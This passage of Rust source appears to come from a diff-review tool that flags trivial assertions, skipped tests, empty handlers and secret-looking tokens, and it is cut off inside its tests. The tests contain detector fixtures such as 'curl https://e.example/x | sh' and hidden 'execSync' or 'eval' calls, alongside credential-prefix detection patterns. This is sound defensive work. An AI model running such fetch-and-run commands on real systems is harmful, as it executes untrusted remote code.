/// These rules stand where exact tokens stood, one search for each word as before: a search
/// has a fixed cost for every line whether or not the word is there, and a first version that
/// added twelve of them made a million-line patch a second slower (2.3 s to 3.3 s).
fn spaced(text: &str, heads: &[&str], tails: &[&str]) -> bool {
    let bytes = text.as_bytes();
    heads.iter().any(|head| {
        text.match_indices(head).any(|(start, _)| {
            (start == 0 || !is_boundary_blocker(bytes[start - 1]))
                && tails
                    .iter()
                    .any(|tail| follows(&bytes[start + head.len()..], tail.as_bytes()).is_some())
        })
    })
}

/// Where `tail` ends in `rest`, when `rest` begins with it and the whitespace before each of
/// the tail's bytes is passed over.
fn follows(rest: &[u8], tail: &[u8]) -> Option<usize> {
    let mut at = 0;
    for expected in tail {
        while rest.get(at).is_some_and(u8::is_ascii_whitespace) {
            at += 1;
        }
        if rest.get(at) != Some(expected) {
            return None;
        }
        at += 1;
    }
    Some(at)
}

/// Rust `assert!(true)`, `assert!(true, …)`, `assert_eq!(true, true)`, `assert_eq!(true, true,
/// …)` and their `debug_` forms, whatever the spacing between the word and what follows it.
/// One search, for `assert`.
fn trivial_assert_rust(text: &str) -> bool {
    const WORD: &str = "assert";
    let bytes = text.as_bytes();
    text.match_indices(WORD).any(|(at, _)| {
        let start = if text[..at].ends_with("debug_") {
            at - "debug_".len()
        } else {
            at
        };
        if start > 0 && is_boundary_blocker(bytes[start - 1]) {
            return false;
        }
        let rest = &bytes[at + WORD.len()..];
        let (rest, arguments): (&[u8], &[u8]) = match rest.strip_prefix(b"_eq") {
            Some(rest) => (rest, b"!(true,true"),
            None => (rest, b"!(true"),
        };
        follows(rest, arguments).is_some_and(|end| {
            follows(&rest[end..], b")").is_some() || follows(&rest[end..], b",").is_some()
        })
    })
}

/// Rust `#[ignore]`, `#[ignore = "…"]`, and `#[cfg_attr(…, ignore)]` (with `= "…"` or more
/// after `ignore`): the test does not run, or does not under some configuration. Whatever the
/// spacing. One search, for `#`.
fn ignore_rust(text: &str) -> bool {
    let bytes = text.as_bytes();
    text.match_indices('#').any(|(at, _)| {
        if at > 0 && is_boundary_blocker(bytes[at - 1]) {
            return false;
        }
        let rest = &bytes[at + 1..];
        if let Some(end) = follows(rest, b"[ignore") {
            return rest
                .get(end)
                .is_none_or(|b| !(b.is_ascii_alphanumeric() || *b == b'_'));
        }
        follows(rest, b"[cfg_attr(").is_some_and(|end| {
            let squeezed: Vec<u8> = rest[end..]
                .iter()
                .copied()
                .filter(|b| !b.is_ascii_whitespace())
                .collect();
            [&b",ignore)]"[..], b",ignore,", b",ignore="]
                .iter()
                .any(|tail| squeezed.windows(tail.len()).any(|w| w == *tail))
        })
    })
}

/// What the parser says about the added lines of a Rust hunk: `(line index, signal)` pairs it
/// found, and pairs it withdraws because the hunk proves test code around them. Both are sorted
/// by line index.
struct Parsed {
    found: Vec<(usize, EvidenceSignal)>,
    withdrawn: Vec<(usize, EvidenceSignal)>,
    /// The first added line that opens an assertion or a conditional attribute over several
    /// lines in a place the parser names no construct for (inside another macro's body, or
    /// under an error): neither the parser nor the token rules, which read one line, read it.
    unread: Option<usize>,
}

impl Parsed {
    /// Whether `list` (sorted by line index) holds `signal` for line `at`.
    fn has(list: &[(usize, EvidenceSignal)], at: usize, signal: EvidenceSignal) -> bool {
        let from = list.partition_point(|pair| pair.0 < at);
        list[from..]
            .iter()
            .take_while(|pair| pair.0 == at)
            .any(|pair| pair.1 == signal)
    }
}

/// One side of a hunk as the parser read it.
struct SideScan {
    scan: FragmentScan,
    /// Rows the wrapping put before the first line of the side.
    offset: u32,
    /// The hunk lines of this side, in order: row `n` of the side is `hunk.lines[lines[n]]`.
    lines: Vec<usize>,
}

impl SideScan {
    /// The hunk line that tree row `row` is, when it is a line of this side.
    fn line_of(&self, row: u32) -> Option<usize> {
        let row = row.checked_sub(self.offset)?;
        self.lines.get(row as usize).copied()
    }
}

/// One side of `hunk` (its context lines and its added or removed lines) parsed as a fragment,
/// after the braces the hunk leaves open are closed and the ones it closes without opening are
/// opened. Up to three wrappings are tried and the one the parser reads most of is kept. `None`
/// when there is no answer: the side is over the fragment budget, or the parser gave none.
fn scan_side(
    hunk: &PatchHunk,
    views: &[(Option<String>, Option<String>)],
    side: Side,
) -> Option<SideScan> {
    let other = match side {
        Side::New => PatchLineKind::Removed,
        Side::Old => PatchLineKind::Added,
    };
    let lines: Vec<usize> = (0..hunk.lines.len())
        .filter(|at| hunk.lines[*at].kind != other)
        .collect();
    // The size is known before anything is built: a hunk over the budget used to be joined and
    // wrapped first, and a 60 MiB line of `}` cost 900 MiB (review V3 round 2, VD3R2-H-2).
    let bytes: usize = lines.iter().map(|at| hunk.lines[*at].text.len() + 1).sum();
    if bytes > deep_diff_forge_syntax::FRAGMENT_BYTE_BUDGET {
        return None;
    }
    // Braces are counted on the code view, where a brace in a string or a comment is blank.
    let (mut unopened, mut open) = (0usize, 0usize);
    for at in &lines {
        let view = match side {
            Side::New => views[*at].1.as_deref(),
            Side::Old => views[*at].0.as_deref(),
        };
        for byte in view.unwrap_or(hunk.lines[*at].text.as_str()).bytes() {
            match byte {
                b'{' => open += 1,
                b'}' if open == 0 => unopened += 1,
                b'}' => open -= 1,
                _ => {}
            }
        }
    }
    let body: Vec<&str> = lines
        .iter()
        .map(|at| hunk.lines[*at].text.as_str())
        .collect();
    let body = body.join("\n");
    let rows = u32::try_from(lines.len()).ok()?;
    let closers = "}".repeat(open + unopened + 1);
    // Each wrapping puts its opening on one line of its own, so a body row is a tree row less one.
    let mut wrappings: Vec<(String, u32)> = Vec::new();
    if unopened == 0 && open == 0 {
        wrappings.push((body.clone(), 0));
    }
    wrappings.push((
        format!(
            "fn ddf_fragment() {{{}\n{body}\n{closers}",
            " {".repeat(unopened)
        ),
        1,
    ));
    if unopened > 0 {
        // The innermost block the hunk closes may be a `match`.
        wrappings.push((
            format!(
                "fn ddf_fragment() {{{} match ddf_fragment {{\n{body}\n{closers}",
                " {".repeat(unopened - 1)
            ),
            1,
        ));
    }
    let mut best: Option<(u32, FragmentScan, u32)> = None;
    for (source, offset) in wrappings {
        let Some(scan) = scan_fragment(deep_diff_forge_syntax::Language::Rust, &source) else {
            continue;
        };
        let unread = (0..rows).filter(|row| !scan.readable(row + offset)).count();
        let unread = u32::try_from(unread).unwrap_or(u32::MAX);
        if best.as_ref().is_none_or(|(least, _, _)| unread < *least) {
            best = Some((unread, scan, offset));
        }
        if unread == 0 {
            break;
        }
    }
    let (_, scan, offset) = best?;
    Some(SideScan {
        scan,
        offset,
        lines,
    })
}

/// What the parser finds on the added lines of `hunk`. `None` when there is no answer (nothing
/// added, over budget, or no parse).
///
/// A construct that starts on an added line is new. A construct that starts on an unchanged
/// line and reaches an added one (a macro invocation or an attribute over several lines) was
/// there before, so it is evidence unless the old side shows the same construct, at the same
/// place on that line, already carrying the same signal: `assert!(` over `computes()` becoming
/// `assert!(` over `true` is a trivial assertion added, on the added line; a `todo!(…)` or an
/// `assert!(true, …)` whose message alone changed is not (review V3 round 2, VD3R2-M-1). The
/// place is the line and the column, so another construct on the same line is not mistaken for
/// it, and when the old side cannot be read the item stands: what is not known is never a
/// reason to drop evidence (review V3 round 3, VD3R3-M-1). The old side is parsed only when
/// such a construct is met.
fn fragment_evidence(
    hunk: &PatchHunk,
    views: &[(Option<String>, Option<String>)],
    whole_file: bool,
) -> Option<Parsed> {
    fragment_cost(hunk)?;
    let new = scan_side(hunk, views, Side::New)?;
    // The parser's proof of test code holds only for a fragment that is its whole file, read
    // as it stands: the one hunk of a new file, every line added. Any other hunk can show a
    // `#[cfg(test)]` that a comment or a string opened above it holds (`/*` above, then
    // `#[cfg(test)] // */`), and then the function under it is in the program. A hunk of an
    // existing file that says it starts at line 1 is no better: its header is the patch
    // writer's word, and `git apply --unidiff-zero` or `-C0` applies it further down (review
    // V3 round 4, VD3R4-H-1). A patch that creates a file is refused when the file exists.
    let whole_file = whole_file
        && new.offset == 0
        && hunk.new_start == Some(1)
        && hunk
            .lines
            .iter()
            .all(|line| line.kind == PatchLineKind::Added);
    let mut old: Option<Option<SideScan>> = None;
    let mut parsed = Parsed {
        found: Vec::new(),
        withdrawn: Vec::new(),
        unread: None,
    };
    for construct in &new.scan.constructs {
        let Some(signal) = signal_of(&construct.kind) else {
            continue;
        };
        let Some(start) = new.line_of(construct.row) else {
            continue;
        };
        let index = if hunk.lines[start].kind == PatchLineKind::Added {
            start
        } else {
            let Some(added) = (construct.row..=construct.last_row)
                .filter_map(|row| new.line_of(row))
                .find(|index| hunk.lines[*index].kind == PatchLineKind::Added)
            else {
                continue;
            };
            let carried_it_before = old
                .get_or_insert_with(|| scan_side(hunk, views, Side::Old))
                .as_ref()
                .is_some_and(|before| {
                    before.scan.constructs.iter().any(|was| {
                        before.line_of(was.row) == Some(start)
                            && was.column == construct.column
                            && signal_of(&was.kind) == Some(signal)
                    })
                });
            if carried_it_before {
                continue;
            }
            added
        };
        if signal == S::PanicPathAdded && construct.in_test && whole_file {
            parsed.withdrawn.push((index, signal));
        } else {
            parsed.found.push((index, signal));
        }
    }
    // What the token rules found inside a macro's body (`assert_eq!(f().unwrap(), 1)`) has no
    // construct, and is test code all the same when its whole row is inside a proved item.
    if whole_file {
        for (row, index) in (0u32..).zip(&new.lines) {
            if hunk.lines[*index].kind == PatchLineKind::Added && new.scan.inside_test(row) {
                parsed.withdrawn.push((*index, S::PanicPathAdded));
            }
        }
    }
    // The parser read the hunk, and still there are places in it where it names no construct:
    // inside another macro's body, which it does not expand, and under an error. A construct
    // on one line there is the token rules' to find. One that is opened on a line and closed on
    // another is nobody's: `outer! {` … `assert!(` / `true` / `);` … `}` left no trace (review
    // V3 round 4, VD3R4-M-1). The line that opens it says that it was not checked.
    parsed.unread = (0u32..)
        .zip(&new.lines)
        .find(|(row, index)| {
            let tree_row = row + new.offset;
            hunk.lines[**index].kind == PatchLineKind::Added
                && !new.scan.readable(tree_row)
                && !new.scan.constructs.iter().any(|read| {
                    read.row == tree_row && !matches!(read.kind, ConstructKind::MethodCall { .. })
                })
                && opens_across_lines(
                    views[**index]
                        .1
                        .as_deref()
                        .unwrap_or(hunk.lines[**index].text.as_str()),
                )
        })
        .map(|(_, index)| *index);
    parsed.found.sort_by_key(|pair| pair.0);
    parsed.withdrawn.sort_by_key(|pair| pair.0);
    Some(parsed)
}

/// Whether a line of Rust code opens an assertion macro, or a `cfg_attr` attribute, that it
/// does not close: the rest is on other lines, where a rule that reads one line cannot follow.
fn opens_across_lines(code: &str) -> bool {
    const WORD: &str = "assert";
    let bytes = code.as_bytes();
    let unclosed = |rest: &[u8]| {
        let mut depth = 1usize;
        for byte in rest {
            match byte {
                b'(' => depth += 1,
                b')' => depth -= 1,
                _ => {}
            }
            if depth == 0 {
                return false;
            }
        }
        true
    };
    let assertion = code.match_indices(WORD).any(|(at, _)| {
        let start = if code[..at].ends_with("debug_") {
            at - "debug_".len()
        } else {
            at
        };
        if start > 0 && is_boundary_blocker(bytes[start - 1]) {
            return false;
        }
        let rest = &bytes[at + WORD.len()..];
        let rest = rest.strip_prefix(b"_eq").unwrap_or(rest);
        follows(rest, b"!(").is_some_and(|end| unclosed(&rest[end..]))
    });
    assertion
        || code.match_indices('#').any(|(at, _)| {
            let rest = &bytes[at + 1..];
            follows(rest, b"[cfg_attr(").is_some_and(|end| unclosed(&rest[end..]))
        })
}

/// The signal a Rust construct is evidence of, if any.
fn signal_of(kind: &ConstructKind) -> Option<EvidenceSignal> {
    match kind {
        ConstructKind::Attribute { words } => {
            let first = words.first().map(String::as_str);
            let ignored = first == Some("ignore")
                || (first == Some("cfg_attr") && words.iter().skip(1).any(|w| w == "ignore"));
            ignored.then_some(S::TestSkipped)
        }
        ConstructKind::MacroCall { name, arguments } => match name.as_str() {
            "assert" | "debug_assert" => {
                (arguments == "true" || arguments.starts_with("true,")).then_some(S::TrivialAssert)
            }
            "assert_eq" | "debug_assert_eq" => (arguments == "true,true"
                || arguments.starts_with("true,true,"))
            .then_some(S::TrivialAssert),
            "todo" | "unimplemented" => Some(S::StubAdded),
            _ => None,
        },
        ConstructKind::MethodCall { name } => {
            matches!(name.as_str(), "unwrap" | "expect").then_some(S::PanicPathAdded)
        }
    }
}

/// Whether `code` (a line's code view) opens an error handler that does nothing, given the code
/// of the line after it on the same side (`None` when the hunk ends there).
///
/// - Python: `except …:` whose body is `pass` or `...`, on the same line or the next.
/// - JS and TS: `catch`, with or without a binding, whose block is empty: `{}` on the line, `{`
///   ending the line and `}` starting the next, or the whole empty block on the next line. Also
///   a promise's `.catch(…)` whose handler is a function with an empty body, on one line.
/// - Go: `if err != nil {`, with or without a statement before the test, closed at once, on the
///   line or the next.
///
/// A handler whose body the hunk does not show is not evidence: the next line must be there.
fn empty_handler(language: Language, code: &str, next: Option<&str>) -> bool {
    let line = code.trim();
    let next = next.map(str::trim);
    let nothing = |body: &str| matches!(body, "pass" | "...");
    // The block after `head` is empty: `{}` here, or `{` here and `}` first on the next line.
    let empty_block = |after: &str| {
        let after = after.trim();
        let closed_here = after
            .strip_prefix('{')
            .is_some_and(|rest| rest.trim_start().starts_with('}'));
        let block_on_next_line = after.is_empty()
            && next.is_some_and(|n| {
                n.strip_prefix('{')
                    .is_some_and(|rest| rest.trim_start().starts_with('}'))
            });
        closed_here
            || (after == "{" && next.is_some_and(|n| n.starts_with('}')))
            || block_on_next_line
    };
    match language {
        Language::Python => {
            let Some(rest) = line.strip_prefix("except") else {
                return false;
            };
            if rest.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                return false;
            }
            let Some((_, body)) = rest.rsplit_once(':') else {
                return false;
            };
            let body = body.trim();
            nothing(body) || (body.is_empty() && next.is_some_and(nothing))
        }
        Language::JavaScript => line.match_indices("catch").any(|(at, word)| {
            // A promise's `.catch(…)` swallows when its handler is a function with an empty body.
            if at > 0 && line.as_bytes()[at - 1] == b'.' {
                return empty_callback(&line[at + word.len()..]);
            }
            let before_ok = at == 0 || !is_boundary_blocker(line.as_bytes()[at - 1]);
            let after = line[at + word.len()..].trim_start();
            if !before_ok || after.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                return false;
            }
            // An optional binding in parentheses, then the block.
            let after = match after.strip_prefix('(') {
                Some(binding) => match binding.split_once(')') {
                    Some((_, block)) => block,
                    None => return false,
                },
                None => after,
            };
            empty_block(after)
        }),
        // `if err != nil {` and `if err := f(); err != nil {`: the test comes last in the head.
        Language::Go => line.strip_prefix("if ").is_some_and(|head| {
            head.rsplit_once("err != nil")
                .is_some_and(|(_, after)| empty_block(after))
        }),
        Language::Rust | Language::Shell | Language::Yaml => false,
    }
}

/// Whether `after` (what follows `.catch` on a line of code) is a call whose argument is a
/// function with an empty body: `(() => {})`, `(e => {})`, `(async (e) => { })`,
/// `(function () {})`. Anything else, including a handler that names a function, is not.
fn empty_callback(after: &str) -> bool {
    let Some(inner) = after.trim_start().strip_prefix('(') else {
        return false;
    };
    let inner = inner.trim_start();
    let inner = inner.strip_prefix("async ").unwrap_or(inner).trim_start();
    let body = if let Some(rest) = inner.strip_prefix("function") {
        // An optional name, then the parameters.
        let rest = rest.trim_start();
        let name = rest.bytes().take_while(|b| is_ident(*b)).count();
        let Some(rest) = rest
            .get(name..)
            .and_then(|rest| after_closing(rest.trim_start(), b'(', b')'))
        else {
            return false;
        };
        rest
    } else {
        let after_parameters = if inner.starts_with('(') {
            after_closing(inner, b'(', b')')
        } else {
            inner.get(inner.bytes().take_while(|b| is_ident(*b)).count()..)
        };
        let Some(rest) = after_parameters.and_then(|rest| rest.trim_start().strip_prefix("=>"))
        else {
            return false;
        };
        rest
    };
    body.trim_start()
        .strip_prefix('{')
        .and_then(|rest| rest.trim_start().strip_prefix('}'))
        .is_some_and(|rest| rest.trim_start().starts_with(')'))
}

/// What follows the `close` that matches the `open` that `text` starts with, nesting counted:
/// for `(a = f(), b) => {}` and parentheses, ` => {}`. `None` when `text` does not start with
/// `open` or it is never closed. `text` is a code view, so a delimiter in a string is blank.
/// Before, the first `)` ended the parameters, and a default value that calls a function hid an
/// empty handler (review V3 round 2, VD3R2-L-1).
fn after_closing(text: &str, open: u8, close: u8) -> Option<&str> {
    if text.as_bytes().first() != Some(&open) {
        return None;
    }
    let mut depth = 0usize;
    for (at, byte) in text.bytes().enumerate() {
        if byte == open {
            depth += 1;
        } else if byte == close {
            depth -= 1;
            if depth == 0 {
                return text.get(at + 1..);
            }
        }
    }
    None
}

/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)` (also
/// `module.require`), `import(…)`, `import …` or `from …`. The keyword and the opening quote must
/// be code in `code` (the line's code view), so a comment or a string that mentions an import
/// does not count; the specifier is read from `raw` at the same offset. A type-only statement
/// (`import type`, `export type`) and `typeof import(…)` load nothing and do not count
/// (`typeof require(…)` still calls `require`); an
/// `import(…)` type annotation does (it errs toward evidence).
fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
    let c = code.as_bytes();
    let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
        let before = &code[..at];
        let receiver_ok = at == 0
            || !is_boundary_blocker(c[at - 1])
            || (keyword == "require" && before.ends_with("module."));
        let after = at + keyword.len();
        if !receiver_ok
            || c.get(after).is_some_and(|b| is_ident(*b))
            || (keyword == "import" && before.trim_end().ends_with("typeof"))
        {
            return None;
        }
        // Whitespace and any number of `(` may sit between the keyword and the specifier.
        let gap = c[after..]
            .iter()
            .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
            .count();
        let q = after + gap;
        if keyword == "require" && !c[after..q].contains(&b'(') {
            return None;
        }
        let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
        let name = raw.get(q + 1..)?;
        let name = &name[..name.find(char::from(quote))?];
        Some(name.strip_prefix("node:").unwrap_or(name))
    };
    // Every keyword hit in line order, so one forward walk knows which statement each is in
    // and the type-only test runs once per statement: the line stays linear.
    let mut hits: Vec<(usize, &str)> = ["require", "import", "from"]
        .iter()
        .flat_map(|keyword| code.match_indices(keyword).map(|(at, _)| (at, *keyword)))
        .collect();
    hits.sort_unstable();
    // `start` is where the current statement begins; only the bytes since the last hit are
    // searched for a later `;`.
    let (mut seen, mut start, mut type_only) = (0, 0, None);
    hits.into_iter().any(|(at, keyword)| {
        if let Some(semi) = code[seen..at].rfind(';') {
            start = seen + semi + 1;
            type_only = None;
        }
        seen = at;
        let skip = *type_only.get_or_insert_with(|| {
            let head = code[start..].trim_start();
            head.starts_with("import type ") || head.starts_with("export type ")
        });
        !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
    })
}

fn token_in(text: &str, token: &str) -> bool {
    match token.strip_suffix('*') {
        // A prefix token: a boundary before it, none required after.
        Some(prefix) => text
            .match_indices(prefix)
            .any(|(i, _)| i == 0 || !is_boundary_blocker(text.as_bytes()[i - 1])),
        None => has_token(text, token),
    }
}

/// A private key header, or a cloud, forge or chat token by its fixed prefix and length.
/// The token itself is never copied into evidence: only its line number is.
#[must_use]
fn looks_like_secret(text: &str) -> bool {
    if text.contains("-----BEGIN") && text.contains("PRIVATE KEY") {
        return true;
    }
    let tail = |prefix: &str, min: usize, ok: fn(u8) -> bool| {
        text.match_indices(prefix).any(|(i, _)| {
            let before = i.checked_sub(1).map(|j| text.as_bytes()[j]);
            let boundary = before.is_none_or(|b| !b.is_ascii_alphanumeric());
            let run = text.as_bytes()[i + prefix.len()..]
                .iter()
                .take_while(|b| ok(**b))
                .count();
            boundary && run >= min
        })
    };
    let upper_digit = |b: u8| b.is_ascii_uppercase() || b.is_ascii_digit();
    let alnum = |b: u8| b.is_ascii_alphanumeric();
    let slack = |b: u8| b.is_ascii_alphanumeric() || b == b'-';
    tail("AKIA", 16, upper_digit)
        || ["ghp_", "gho_", "ghs_", "ghu_", "ghr_"]
            .iter()
            .any(|p| tail(p, 36, alnum))
        || ["xoxb-", "xoxp-", "xoxa-", "xoxr-"]
            .iter()
            .any(|p| tail(p, 10, slack))
        || tail("sk_live_", 16, alnum)
}

#[cfg(test)]
mod tests {
    use super::*;
    use deep_diff_forge_patch::parse;

    /// One file whose single hunk keeps a context line `x` and adds (`+`) or removes (`-`)
    /// `lines` after it.
    fn changed(path: &str, sign: char, lines: &[&str]) -> ReviewFile {
        let n = lines.len() + 1;
        let header = if sign == '+' {
            format!("@@ -1,1 +1,{n} @@")
        } else {
            format!("@@ -1,{n} +1,1 @@")
        };
        let mut text = format!("--- a/{path}\n+++ b/{path}\n{header}\n x\n");
        for line in lines {
            text.push(sign);
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn added(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '+', lines)
    }

    fn removed(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '-', lines)
    }

    fn signals(file: &ReviewFile) -> Vec<EvidenceSignal> {
        file_evidence(file).iter().map(|e| e.signal).collect()
    }

    /// A path and the line a rule's token would appear on in that language.
    fn sample_path(scope: Scope) -> &'static str {
        match scope {
            Scope::Languages(languages) => match languages[0] {
                Language::Rust => "src/x.rs",
                Language::Python => "x.py",
                Language::JavaScript => "x.ts",
                Language::Go => "x.go",
                Language::Shell => "x.sh",
                Language::Yaml => "x.yml",
            },
            Scope::Any => "notes.txt",
            Scope::CiWorkflow => ".github/workflows/ci.yml",
            Scope::BuildScript => "build.rs",
            Scope::PackageJson => "package.json",
        }
    }

    fn sample_token(token: &str) -> String {
        match token.strip_suffix('*') {
            Some(prefix) => format!("{prefix}_case()"),
            None => format!("{token} x"),
        }
    }

    /// N8: every token in the table has a case that finds it, on the side the rule reads.
    #[test]
    fn every_token_in_the_table_is_found() {
        for rule in RULES {
            if let Match::Imports(modules) = rule.matches {
                for module in modules {
                    let line = format!("const m = require(\"{module}\");");
                    let file = added(sample_path(rule.scope), &[&line]);
                    assert!(signals(&file).contains(&rule.signal), "{module}");
                }
            }
            let Match::Tokens(tokens) = rule.matches else {
                continue;
            };
            for token in tokens {
                let path = sample_path(rule.scope);
                let line = sample_token(token);
                let file = match rule.side {
                    Side::New => added(path, &[&line]),
                    Side::Old => removed(path, &[&line]),
                };
                assert!(
                    signals(&file).contains(&rule.signal),
                    "{} not found for {token:?} in {path}",
                    rule.signal.label()
                );
            }
        }
    }

    /// The same tokens in a comment or a string are not code.
    #[test]
    fn a_token_in_a_comment_or_string_is_not_code() {
        for (path, lines) in [
            (
                "src/x.rs",
                &[
                    "// unsafe Command::new",
                    "let s = \"unsafe { Command::new }\";",
                    "/* unsafe",
                ][..],
            ),
            (
                "x.py",
                &[
                    "# subprocess.run eval(",
                    "s = 'os.system(x)'",
                    "\"\"\"",
                    "eval(x)",
                    "\"\"\"",
                ][..],
            ),
            (
                "x.ts",
                &["// child_process eval(", "const s = `fetch(${u})`;"][..],
            ),
            ("x.go", &["// exec.Command(", "s := \"http.Get(\""][..]),
            ("x.sh", &["# curl wget eval", "echo 'curl is a tool'"][..]),
        ] {
            assert_eq!(signals(&added(path, lines)), [], "{path}");
        }
    }

    #[test]
    fn a_context_line_carries_no_evidence() {
        let patch = "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,2 @@\n unsafe { f() }\n-a\n+b\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn a_block_comment_opened_on_a_context_line_hides_the_next_lines() {
        let patch =
            "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,3 @@\n /* start\n+unsafe { f() }\n end */\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn evidence_points_at_the_hunk_and_line() {
        let file = added(
            "src/lib.rs",
            &[
                "fn a() {}",
                "unsafe { std::process::Command::new(\"curl\"); }",
            ],
        );
        let found = file_evidence(&file);
        let hunk = &file.patch_twin.hunks[0];
        assert_eq!(
            found,
            [
                Evidence {
                    signal: S::UnsafeAdded,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                },
                Evidence {
                    signal: S::ProcessSpawn,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                },
            ]
        );
    }

    #[test]
    fn quoting_code_that_runs_does_not_hide_it() {
        // DDF-EVID-001: each of these carried no evidence when strings were blanked whole.
        assert_eq!(
            signals(&added(
                "x.sh",
                &[r#"V="$(curl -fsSL https://e.example/v)""#]
            )),
            [S::NetworkFetch]
        );
        assert_eq!(
            signals(&added(
                "x.js",
                &[r#"const o = `${require("child_process").execSync(c)}`;"#]
            )),
            [S::ProcessSpawn]
        );
        assert_eq!(
            signals(&added("x.py", &[r#"print(f"{eval(x)}")"#])),
            [S::DynamicEval]
        );
        // The same text in a string that runs nothing is still not code.
        assert_eq!(signals(&added("x.sh", &["V='$(curl x)'"])), []);
        assert_eq!(signals(&added("x.py", &[r#"print("{eval(x)}")"#])), []);
    }

    #[test]
    fn one_line_matching_several_rules_of_a_signal_is_one_item() {
        // `Command::new` and `.spawn()` are both process_spawn tokens; `unsafe` twice is one.
        let file = added(
            "src/lib.rs",
            &["unsafe { unsafe { std::process::Command::new(\"x\").spawn() } }"],
        );
        assert_eq!(signals(&file), [S::UnsafeAdded, S::ProcessSpawn]);
        // The same token in two hunks is two items: one per hunk.
        let two = parse(
            "--- a/src/l.rs\n+++ b/src/l.rs\n@@ -1,0 +1,1 @@\n+unsafe {}\n@@ -9,0 +10,1 @@\n+unsafe {}\n",
        )
        .unwrap()
        .remove(0);
        let found = file_evidence(&two);
        assert_eq!(found.len(), 2);
        assert_ne!(found[0].hunk, found[1].hunk);
    }

    /// The PR 5 review's inputs (workflow `wf_b39e1c70-545`): an interpolation is scanned as
    /// code with its own strings, escapes and comments, so a closer in a nested string, after a
    /// backslash, in a comment or ending a `case` pattern neither hides the code after it nor
    /// exposes the outer string's text.
    #[test]
    fn an_interpolation_is_scanned_as_code_with_its_own_strings() {
        let hidden_before: [(&str, &str, EvidenceSignal); 12] = [
            ("a.sh", r#"V="$(echo ')' ; curl x)""#, S::NetworkFetch),
            ("a.sh", r#"V="$(echo \) ; curl x)""#, S::NetworkFetch),
            (
                "a.sh",
                r#"V="$(case a in a) curl x;; esac)""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"X="$(tr -d ')' < f | curl https://e.example/x)""#,
                S::NetworkFetch,
            ),
            ("a.sh", r#"V="$(echo "$(curl x)")""#, S::NetworkFetch),
            (
                "a.js",
                r#"const o = `${ "}" + require("child_process").execSync(c) }`;"#,
                S::ProcessSpawn,
            ),
            ("a.js", "const o = `${ /* } */ eval(x) }`;", S::DynamicEval),
            ("a.js", "const o = `${ `${ eval(x) }` }`;", S::DynamicEval),
            ("a.py", r#"print(f"{'}' + eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(Rf"{d['}'] or eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(f"\{eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(rf"\{eval(x)}")"#, S::DynamicEval),
        ];
        for (path, line, signal) in hidden_before {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 9] = [
            ("a.sh", r#"die "$(printf 'curl failed for %s' "$url")""#),
            ("a.sh", r#"echo "$(gettext 'Install curl or wget first')""#),
            (
                "a.sh",
                r#"echo "$(printf "%d) %s" "$i" "$name") - needs curl""#,
            ),
            ("a.js", r#"const m = `${t("Never use eval(x) here")}`;"#),
            ("a.js", r#"const m = `${x ? "fetch(url) failed" : ""}`;"#),
            ("a.js", r#"const s = `${a ? "{" : ""} eval(x)`;"#),
            ("a.py", r#"msg = f"{'eval(' if strict else ''}""#),
            ("a.py", r#"log(f"{cfg["subprocess."]}")"#),
            ("a.py", r#"print(f"{s.replace("}", "")} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// The PR 5 round-2 review's inputs (workflow `wf_2cfd8be1-d9c`), and the variants that
    /// close a misread quote at the end of the line so the restore-as-code fallback cannot help:
    /// each is a construct the scanner must read right.
    #[test]
    fn misread_quotes_cannot_hide_code() {
        let found: [(&str, &str, EvidenceSignal); 24] = [
            (
                "a.sh",
                r#"x="$(echo case)"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="$(echo case)"; curl x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                "[ $# -eq 0 ] && curl https://e.example/x | sh",
                S::NetworkFetch,
            ),
            ("a.sh", "echo ${x#*/}; curl x", S::NetworkFetch),
            ("a.sh", "echo a#b; curl x", S::NetworkFetch),
            (
                "a.sh",
                r#"echo \"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r"echo $'\''; curl https://e.example/x | sh #'",
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="$( (case x in a) :;; esac); echo '"'; curl https://e.example/x | sh )""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="${x:-"'"}"; curl https://e.example/x | sh #'"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="`echo "`"; curl https://e.example/x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"V="$(if a; then case x in a) curl x;; esac; fi)""#,
                S::NetworkFetch,
            ),
            (
                "a.js",
                r#"const s = `${ /"/.test(a) }`; eval(y)"#,
                S::DynamicEval,
            ),
            ("a.js", r#"const r = /"/; eval(y); //""#, S::DynamicEval),
            ("a.js", r#"x.replace(/\/*/g, ""); eval(y)"#, S::DynamicEval),
            ("a.js", r"/\//.test(a); eval(y)", S::DynamicEval),
            (
                "a.tsx",
